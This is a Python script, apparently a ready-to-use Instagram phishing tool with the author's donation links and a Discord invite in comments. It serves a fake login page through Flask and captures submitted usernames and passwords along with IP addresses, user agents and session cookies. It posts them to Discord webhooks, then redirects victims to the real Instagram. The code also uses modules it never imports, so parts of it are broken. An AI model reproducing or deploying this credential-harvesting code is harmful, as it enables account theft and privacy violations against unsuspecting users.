# by Divided
# www.linktr.ee/cantstopdivided
# www.zayd099.carrd.co/#sendmemoney
# ^ send me money uwu :3
# if i raise at least $30.99 worth of donations before April,
# i'll do paypal
# discord.gg/6MdgHjbyYh
import os #os for operating system. zayde makes divinixOS when
import platform #wmc real

def clear():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def quick_setup():
    try:
        os.system("pip install -r requirements.txt")
        os.system("pip3 install -r requirements.txt")
    # this happens if your racist
    except Exception as e:
        exit("\nSomething seems to be wrong, maybe this is caused by a network error or something, please try again later lol.")
        
try:
    import threading #gem likes to thread lol
    from flask import Flask, render_template, request, make_response, redirect #zayde hates plastic
    import requests #i request hrt now b*tch NOW!!
except Exception as e:
    quick_setup()

def InstagOwOwO():
        app = Flask(__name__)

        #add as many webhooks as u want lol
        def load_webhooks():
            webhooks = []
            with open('webhooks.txt', 'r') as file:
                for line in file:
                    if line.startswith("https://") or line.startswith("http://"):
                        webhooks.append(line.strip())
            return webhooks

        WEBHOOK_URLS = load_webhooks()

        def send_to_webhooks(log_entry):
            discord_payload = {
                "content": log_entry
            }
            for url in WEBHOOK_URLS:
                requests.post(url, json=discord_payload)

        @app.route('/', methods=['GET', 'POST'])
        def home():
            start_time = time.time()
            
            if request.method == 'POST':
                data = request.form
                if 'username' in data and 'password' in data:
                    response = make_response(redirect("https://instagram.com"))
                    duration = time.time() - start_time
                    log_request(request, response, duration)
                    return response
                
                response = make_response(render_template('login.html'))
                duration = time.time() - start_time
                log_request(request, response, duration)
            
            else:
                response = make_response(render_template('login.html'))
                duration = time.time() - start_time
                log_request(request, response, duration)
            
            return response

        def log_request(req, response, duration):
            user_id = random.randint(100, 999)
            real_ip = req.headers.get('X-Forwarded-For', req.remote_addr).split(',')[0]
            ip_address = req.remote_addr
            user_agent = req.headers.get('User-Agent')
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())
            method = req.method
            content_type = req.content_type
            status_code = response.status_code
            request_path = req.path
            query_params = req.args
            referer = req.headers.get('Referer', '')
            session_id = request.cookies.get('session_id', 'N/A')

            if req.is_json:
                data = req.get_json()
            else:
                data = req.form

            log_entry = f"# USER {user_id}\n# {'-' * 80}\n"
            log_entry += f"Timestamp: {timestamp}\n"
            log_entry += f"IP Address (direct): {ip_address}\n"
            log_entry += f"Real Client IP: {real_ip}\n"
            log_entry += f"User Agent: {user_agent}\n"
            log_entry += f"Request Method: {method}\n"
            log_entry += f"Content Type: {content_type}\n"
            log_entry += f"Status Code: {status_code}\n"
            log_entry += f"Request Duration: {duration:.3f}s\n"
            log_entry += f"Request Path: {request_path}\n"
            log_entry += f"Query Parameters: {query_params}\n"
            log_entry += f"Referer: {referer}\n"
            log_entry += f"Session ID: {session_id}\n"
            log_entry += f"Request Data:\n{data}\n\n"
            log_entry += f"# {'-' * 80}\n\n"

            send_to_webhooks(log_entry)

        if __name__ == '__main__':
            #set reloader to True if it's not working or something
            #might also want to change the port
            app.run(debug=True, port=52, use_reloader=False)
        
InstagOwOwO()
